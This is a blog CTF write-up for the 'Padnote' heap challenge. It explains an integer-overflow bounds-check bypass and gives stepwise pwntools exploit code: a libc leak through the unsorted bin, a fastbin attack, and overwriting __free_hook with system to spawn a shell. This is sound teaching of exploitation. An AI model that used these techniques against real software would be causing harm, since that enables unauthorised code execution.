@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Linz">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://linz04.github.io/2025/08/05/2021-11-07-padnote/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BsidesAhmed CTF 2021 - Padnote">
+<meta property="og:url" content="https://linz04.github.io/2025/08/05/2021-11-07-padnote/index.html">
+<meta property="og:site_name" content="Linz&#39;s Blog">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://linz04.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-08-05T03:50:08.852Z">
+<meta property="article:modified_time" content="2025-08-05T03:50:08.852Z">
+<meta property="article:author" content="Linz">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://linz04.github.io/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/linux_logo2.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/linux_logo2.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/linux_logo2.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            BsidesAhmed CTF 2021 - Padnote | Linz&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"linz04.github.io","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Linz's Blog","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/linz04","instagram":null,"zhihu":null,"twitter":null,"linkedin":"https://www.linkedin.com/in/linuztri/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Linz&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">BsidesAhmed CTF 2021 - Padnote</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/linux_logo2.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Linz</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-08-05 11:50:08</span>
+        <span class="mobile">2025-08-05 11:50:08</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-08-05 11:50:08</span>
+            <span class="mobile">2025-08-05 11:50:08</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/CTF-Writeups/">CTF Writeups</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/PWN/">PWN</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><blockquote>
+<p>I proudly released the world most secure note after aggressively tested the source code with AFL and CodeQL, and didn’t find any bugs.<br>Author: ptr-yudai</p>
+</blockquote>
+<p>You can download the challenge archive from <a class="link"   target="_blank" rel="noopener" href="https://github.com/linz04/PWN-Writeup/blob/international/BsidesAhmed/padnote/padnote.tar.gz?raw=true" >here<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
+<h2 id="The-Bug"><a href="#The-Bug" class="headerlink" title="The Bug"></a>The Bug</h2><p>Lets look the source code, the bug is in <strong>EditNote</strong> function</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">EditNote</span><span class="params">(Note *note)</span> &#123;</span><br><span class="line">  <span class="type">int</span> offset, count, epos;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check if note is empty */</span></span><br><span class="line">  <span class="keyword">if</span> (!note-&gt;content)</span><br><span class="line">    CHECK_FAIL(<span class="string">&quot;Note is empty&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input offset */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Offset: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d%*c&quot;</span>, &amp;offset) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// IO error</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input count */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Count: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d%*c&quot;</span>, &amp;count) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// IO error</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Security check */</span></span><br><span class="line">  <span class="keyword">if</span> (offset &lt; <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">&quot;Invalid offset&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">&quot;Invalid count&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((epos = offset + count) &lt; <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">&quot;Integer overflow&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (epos &gt; note-&gt;size)</span><br><span class="line">    CHECK_FAIL(<span class="string">&quot;Out-of-bound access&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Edit content */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  ReadLine(&amp;note-&gt;content[offset], count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<br>
+Variable offset, count and epos using integer. So we can trigger **Integer overflow** here.
+But how?<br>
+Value of INT_MAX is +2147483647.<br>
+Value of INT_MIN is -2147483648.<br>
+What if we input INT_MAX+1 or INT_MIN-1? What will happen? Here i wrote example program
+![Example](/images/padnote/padnote.png)
+We can see if we input INT_MAX+1 it will convert to INT_MIN and if we input INT_MIN-1 it will convert to INT_MAX
+So with this we can bypass the security check by input INT_MIN+x to count, since int is 32bit then we can also by pass
+`(epos = offset + count) < 0` lets try this.<br>
+
+
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="Trigger-Bug"><a href="#Trigger-Bug" class="headerlink" title="Trigger Bug"></a>Trigger Bug</h3><p>First we create note with any size</p>
+<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0x30</span>, <span class="string">b&#x27;Linz&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+<p>Check the heap on gdb.<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/padnote/padnote2.png"
+                      alt="Padnote2"
+                ><br>Next we try edit with offset is the size and count INT_MIN-1.<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/padnote/padnote3.png"
+                      alt="Padnote3"
+                ><br>We can see we get no error from our input. Next we see the heap on gdb to check the result.<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/padnote/padnote4.png"
+                      alt="Padnote4"
+                ><br>Nice we successfully overwrite the top chunk with integer overflow.<br><br>Next step is we need to leak libc.</p>
+<h3 id="Leak-LIBC"><a href="#Leak-LIBC" class="headerlink" title="Leak LIBC"></a>Leak LIBC</h3><p>This part a bit challenging because when ce create note, it use <code>calloc</code> instead of <code>malloc</code>.<br><br>Also we only can malloc with 4 index.</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreateNote</span><span class="params">(Note *note)</span> &#123;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">  <span class="type">char</span> *content;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check if note is empty */</span></span><br><span class="line">  <span class="keyword">if</span> (note-&gt;content)</span><br><span class="line">    CHECK_FAIL(<span class="string">&quot;Note is in use&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input data length */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d%*c&quot;</span>, &amp;size) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// IO error</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Security check */</span></span><br><span class="line">  <span class="keyword">if</span> (size &lt;= <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">&quot;Size must be larger than 0&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize note */</span></span><br><span class="line">  <span class="keyword">if</span> (!(content = (<span class="type">char</span>*)<span class="built_in">calloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>), size)))</span><br><span class="line">    CHECK_FAIL(<span class="string">&quot;Could not allocate the memory&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input content */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  ReadLine(content, size);</span><br><span class="line"></span><br><span class="line">  note-&gt;content = content;</span><br><span class="line">  note-&gt;size = size;</span><br><span class="line">  ...</span><br><span class="line">      <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt;= MAX_NOTE) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid index&quot;</span>);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>The different between calloc and malloc that i know calloc doesnt reuse <strong>tcache</strong>. So it is a bit tricky to leak libc.<br><br>Here how we can leak libc.</p>
+<ol>
+<li>Create 7 notes to fill tcache and delete it.<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="built_in">str</span>(i)*<span class="number">8</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div></li>
+<li>Now Create 2 notes for initial overwrite<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0x30</span>, <span class="string">b&#x27;0&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span> ,<span class="string">b&#x27;1&#x27;</span>*<span class="number">8</span>)</span><br></pre></td></tr></table></figure></div></li>
+<li>Create big size malloc to get unsorted bin<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2</span>, <span class="number">0x440</span>, <span class="string">b&quot;2&quot;</span>*<span class="number">8</span>)) <span class="comment">#Unsorted bin</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x30</span>, <span class="string">b&#x27;3&#x27;</span>*<span class="number">8</span>) <span class="comment">#Small chunk</span></span><br></pre></td></tr></table></figure></div>
+Here how it looks like<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/padnote/padnote5.png"
+                      alt="Padnote5"
+                ></li>
+<li>Overwrite index 1 size, to 0x491 then we free index 1.<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>, <span class="number">0x30</span>, -<span class="number">0x80000001</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x491</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/padnote/padnote6.png"
+                      alt="Padnote6"
+                ></li>
+<li>Create 1 note again, with this we can leak libc on index 2<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>, <span class="string">b&#x27;1&#x27;</span>*<span class="number">8</span>)</span><br></pre></td></tr></table></figure></div>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/padnote/padnote7.png"
+                      alt="Padnote7"
+                ></li>
+<li>Print note 2 to get libc leak<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">view(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">leak = u64(p.recvn(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">libc.address = leak - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; ~<span class="number">0xfff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br></pre></td></tr></table></figure></div>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/padnote/padnote8.png"
+                      alt="Padnote8"
+                ></li>
+</ol>
+<h3 id="Gain-Shell"><a href="#Gain-Shell" class="headerlink" title="Gain Shell"></a>Gain Shell</h3><p>We already get libc leak, for gaining the shell, we just use fastbin attack, i will not explain detail about fastbin attack here, you can read<br>some article about that <a class="link"   target="_blank" rel="noopener" href="https://guyinatuxedo.github.io/28-fastbin_attack/explanation_fastbinAttack/index.html" >here<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.<br></p>
+<ol>
+<li>We clear notes index first, next create notes to prepare fastbin attack, since we already full tcache for size 0x60, so we create notes with size 0x60<br>because when we free it, it will move to fastbin.<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">b&#x27;0&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>, <span class="string">b&#x27;1&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x60</span>, <span class="string">b&#x27;3&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment"># delete 1 &amp; 3 it will  ove to fastbin</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/padnote/padnote9.png"
+                      alt="Padnote9"
+                ></li>
+<li>Edit note index 0 to overwrite fastbin index 1, here i overwrite fastbin to __free_hook-xxxxx since we can overwrite __free_hook with overflow later.<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="number">0x60</span>, -<span class="number">0x80000001</span>, <span class="string">b&#x27;X&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x71</span>)+p64(libc.address+<span class="number">0x1ed560</span>+<span class="number">165</span>))</span><br></pre></td></tr></table></figure></div>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/padnote/padnote10.png"
+                      alt="Padnote10"
+                ></li>
+<li>Next create 2 notes, note index 2 will be calloc to our target<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x23</span>+p64(<span class="number">0xdeadbeef</span>))</span><br></pre></td></tr></table></figure></div></li>
+<li>Calculate the offset to __free_hook then overwrite __free_hook to system, delete note 1 and SHELL!<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/padnote/padnote11.png"
+                      alt="Padnote11"
+                ><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">3</span>,<span class="number">0x60</span>-<span class="number">1</span>-<span class="number">4</span>,  -<span class="number">0x80000001</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x14b8</span>+p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/padnote/padnote12.png"
+                      alt="Paadnote12"
+                ></li>
+</ol>
+<p>You can see the full script <a class="link"   target="_blank" rel="noopener" href="https://github.com/linz04/PWN-Writeup/blob/international/BsidesAhmed/padnote/exploit.py" >here<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+
+		</div>
+
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/PWN/">#PWN</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/08/05/2021-11-29-quickmaffs/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">CyberJawara 2021 - Quickmaffs</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">BsidesAhmed CTF 2021 - Padnote</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Introduction"><span class="nav-text">Introduction</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#The-Bug"><span class="nav-text">The Bug</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution"><span class="nav-text">Solution</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Trigger-Bug"><span class="nav-text">Trigger Bug</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Leak-LIBC"><span class="nav-text">Leak LIBC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Gain-Shell"><span class="nav-text">Gain Shell</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
